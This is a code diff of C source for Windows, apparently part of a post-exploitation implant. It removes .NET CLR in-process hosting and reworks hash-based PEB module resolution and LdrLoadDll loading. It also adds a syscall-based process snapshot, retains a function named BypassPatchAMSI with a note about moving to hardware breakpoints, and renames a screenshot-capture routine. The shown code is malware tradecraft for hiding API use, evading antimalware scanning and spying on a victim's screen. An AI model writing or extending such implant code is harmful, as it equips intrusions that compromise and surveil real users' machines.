@@ -6,56 +6,6 @@
 #include <Common/Macros.h>
 #include <Common/Defines.h>
 
-GUID xCLSID_CLRMetaHost     = {0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
-GUID xCLSID_CorRuntimeHost  = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
-GUID xIID_AppDomain         = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
-GUID xIID_ICLRMetaHost      = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
-GUID xIID_ICLRRuntimeInfo   = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
-GUID xIID_ICorRuntimeHost   = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
-
-BOOL W32CreateClrInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PICLRRuntimeInfo *ppClrRuntimeInfo, ICorRuntimeHost **ppICorRuntimeHost )
-{
-    BOOL fLoadable = FALSE;
-
-    if ( Instance.Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, ppClrMetaHost ) == S_OK )
-    {
-        if ( ( *ppClrMetaHost )->lpVtbl->GetRuntime( *ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo ) == S_OK )
-        {
-            if ( ( ( *ppClrRuntimeInfo )->lpVtbl->IsLoadable( *ppClrRuntimeInfo, &fLoadable ) == S_OK ) && fLoadable )
-            {
-                //Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
-                if ( ( *ppClrRuntimeInfo )->lpVtbl->GetInterface( *ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, ppICorRuntimeHost ) == S_OK )
-                {
-                    //Start it. This is okay to call even if the CLR is already running
-                    ( *ppICorRuntimeHost )->lpVtbl->Start( *ppICorRuntimeHost );
-                }
-                else
-                {
-                    PRINTF("[-] ( GetInterface ) Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
-                    return 0;
-                }
-            }
-            else
-            {
-                PRINTF("[-] ( IsLoadable ) Process refusing to load %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
-                return 0;
-            }
-        }
-        else
-        {
-            PRINTF("[-] ( GetRuntime ) Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
-            return 0;
-        }
-    }
-    else
-    {
-        PRINTF("[-] ( CLRCreateInstance ) Process refusing to create %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
-        return 0;
-    }
-
-    return 1;
-}
-
 UINT_PTR HashEx( LPVOID String, UINT_PTR Length, BOOL Upper )
 {
     if ( ! String )
@@ -92,51 +42,51 @@ UINT_PTR HashEx( LPVOID String, UINT_PTR Length, BOOL Upper )
     return Hash;
 }
 
-PVOID LdrModulePeb( DWORD hModuleHash )
+PVOID LdrModulePeb( DWORD Hash )
 {
-    PLDR_DATA_TABLE_ENTRY   pModule      = ( ( PPEB ) PPEB_PTR )->Ldr->InMemoryOrderModuleList.Flink;
-    PLDR_DATA_TABLE_ENTRY   pFirstModule = pModule;
-    DWORD                   ModuleHash   = 0;
+    PLDR_DATA_TABLE_ENTRY Ldr = NULL;
+    PLIST_ENTRY		      Hdr = NULL;
+    PLIST_ENTRY		      Ent = NULL;
+    PPEB			      Peb = NULL;
 
-    do
+    /* Get pointer to list */
+    Peb = Instance.Teb->ProcessEnvironmentBlock;
+    Hdr = & Peb->Ldr->InLoadOrderModuleList;
+    Ent = Hdr->Flink;
+
+    for ( ; Hdr != Ent ; Ent = Ent->Flink )
     {
-        ModuleHash = HashEx( pModule->FullDllName.Buffer, pModule->FullDllName.Length, TRUE );
+        Ldr = C_PTR( Ent );
 
-        if ( ModuleHash == hModuleHash )
-            return pModule->Reserved2[ 0 ];
+        /* Compare the DLL Name! */
+        if ( HashEx( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length, TRUE ) == Hash )
+            return Ldr->DllBase;
+    }
 
-        pModule = pModule->Reserved1[ 0 ];
-
-    } while ( pModule && pModule != pFirstModule );
-
-    return INVALID_HANDLE_VALUE;
+    return NULL;
 }
 
 PVOID LdrModuleLoad( LPSTR ModuleName )
 {
+    UNICODE_STRING UnicodeString  = { 0 };
+    WCHAR          MdlName[ 260 ] = { 0 };
+    PVOID          Module         = NULL;
+    USHORT         DestSize       = 0;
+
     if ( ! ModuleName )
         return NULL;
 
-    UNICODE_STRING  UnicodeString           = { 0 };
-    WCHAR           ModuleNameW[MAX_PATH]   = { 0 };
-    DWORD           dwModuleNameSize        = StringLengthA( ModuleName );
-    HMODULE         Module                  = NULL;
+    CharStringToWCharString( MdlName, ModuleName, StringLengthA( ModuleName ) );
 
-    CharStringToWCharString( ModuleNameW, ModuleName, dwModuleNameSize );
+    DestSize                    = StringLengthW( MdlName ) * sizeof( WCHAR );
+    UnicodeString.Length        = DestSize;
+    UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
+    UnicodeString.Buffer        = MdlName;
 
-    if ( ModuleNameW )
-    {
-        USHORT DestSize = StringLengthW( ModuleNameW ) * sizeof( WCHAR );
-        UnicodeString.Length = DestSize;
-        UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
-    }
-
-    UnicodeString.Buffer = ModuleNameW;
+    /* Let's load that Module
+     * NOTE: LdrLoadDll needs to be resolved or else we have a problem */
     if ( NT_SUCCESS( Instance.Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) )
-    {
-        PRINTF( "%s => [%x]\n", ModuleName, Module );
         return Module;
-    }
     else
         return NULL;
 }
@@ -194,21 +144,22 @@ PVOID LdrFunctionAddr( HMODULE Module, DWORD FunctionHash )
 
 PCHAR TokenGetUserDomain( HANDLE hToken, PDWORD UserSize )
 {
-    LPVOID       TokenUserInfo         = NULL;
-    UCHAR        UserName[ MAX_PATH ]  = { 0 };
-    UCHAR        Domain[ MAX_PATH ]    = { 0 };
-    PUCHAR       UserDomain            = NULL;
-    SID_NAME_USE SidType               = 0;
-    DWORD        dwLength              = 0;
-    DWORD        DomainSize            = MAX_PATH;
-    DWORD        UserNameSize          = MAX_PATH;
-    UCHAR        Deli[ 2 ]             = { '\\', 0 };
+    LPVOID       TokenUserInfo        = NULL;
+    UCHAR        UserName[ MAX_PATH ] = { 0 };
+    UCHAR        Domain[ MAX_PATH ]   = { 0 };
+    PUCHAR       UserDomain           = NULL;
+    SID_NAME_USE SidType              = 0;
+    DWORD        dwLength             = 0;
+    DWORD        DomainSize           = MAX_PATH;
+    DWORD        UserNameSize         = MAX_PATH;
+    UCHAR        Deli[ 2 ]            = { '\\', 0 };
 
+    /* if we got an invalid token just exit */
     if ( ! hToken )
         return NULL;
 
     MemSet( UserName, 0, MAX_PATH );
-    MemSet( Domain, 0, MAX_PATH );
+    MemSet( Domain,   0, MAX_PATH );
 
     if ( ! Instance.Win32.GetTokenInformation( hToken, TokenUser, TokenUserInfo, 0, &dwLength ) )
     {
@@ -263,15 +214,19 @@ HANDLE ProcessOpen( DWORD ProcessID, DWORD Access )
 
 BOOL ProcessIsWow( HANDLE hProcess )
 {
-    PVOID ProcessWowInfo = NULL;
+    ULONG_PTR IsWow64  = NULL;
+    NTSTATUS  NtStatus = STATUS_SUCCESS;
 
-    if ( ! NT_SUCCESS( Instance.Syscall.NtQueryInformationProcess( hProcess, ProcessWow64Information, &ProcessWowInfo, sizeof( PVOID ), NULL ) ) )
+    if ( ! hProcess )
+        return FALSE;
+
+    if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQueryInformationProcess( hProcess, ProcessWow64Information, &IsWow64, sizeof( ULONG_PTR ), NULL ) ) )
     {
-        PUTS( "[!] NtQueryInformationProcess Failed" )
+        PRINTF( "[!] NtQueryInformationProcess Failed: Handle[%x] Status[%lx] DosError[%lx]\n", hProcess, NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
         return FALSE;
     }
 
-    return ProcessWowInfo != 0;
+    return ( IsWow64 != 0 );
 }
 
 BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PROCESS_INFORMATION* ProcessInfo, BOOL Piped, PANONPIPE DataAnonPipes )
@@ -489,7 +444,46 @@ Cleanup:
     return Return;
 }
 
-/* Patch AMSI */
+NTSTATUS ProcessSnapShot( PSYSTEM_PROCESS_INFORMATION* Buffer, PSIZE_T Size )
+{
+    ULONG    Length   = 0;
+    NTSTATUS NtStatus = STATUS_SUCCESS;
+
+    /* Get our system process list */
+    if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQuerySystemInformation( SystemProcessInformation, NULL, 0, &Length ) ) )
+    {
+        PRINTF( "SystemProcessInformation Length: %d\n", Length )
+
+        /* just in case that some processes or threads where created between our calls */
+        Length += 0x1000;
+
+        /* allocate memory */
+        *Buffer = NtHeapAlloc( Length );
+        if ( *Buffer )
+        {
+            if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtQuerySystemInformation( SystemProcessInformation, *Buffer, Length, &Length ) ) )
+            {
+                PRINTF( "SystemProcessInformation Length: %d\n", Length )
+            }
+            else
+            {
+                PRINTF( "NtQuerySystemInformation Failed: Status[%lx] DosError[%lx]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+                goto LEAVE;
+            }
+        }
+    }
+    else
+    {
+        /* we expected to fail. something doesn't seem right... */
+        NtStatus = STATUS_INVALID_PARAMETER;
+    }
+
+LEAVE:
+    return NtStatus;
+}
+
+/* Patch AMSI
+ * TODO: remove this and replace it with hardware breakpoints */
 BOOL BypassPatchAMSI()
 {
     HINSTANCE hModuleAmsi   = NULL;
@@ -610,7 +604,7 @@ VOID AnonPipesClose( PANONPIPE AnonPipes )
     }
 }
 
-BOOL W32TakeScreenShot( PVOID* ImagePointer, PSIZE_T ImageSize )
+BOOL WinScreenshot( PVOID* ImagePointer, PSIZE_T ImageSize )
 {
     BITMAPFILEHEADER    BitFileHdr  = { 0 };
     BITMAPINFOHEADER    BitInfoHdr  = { 0 };
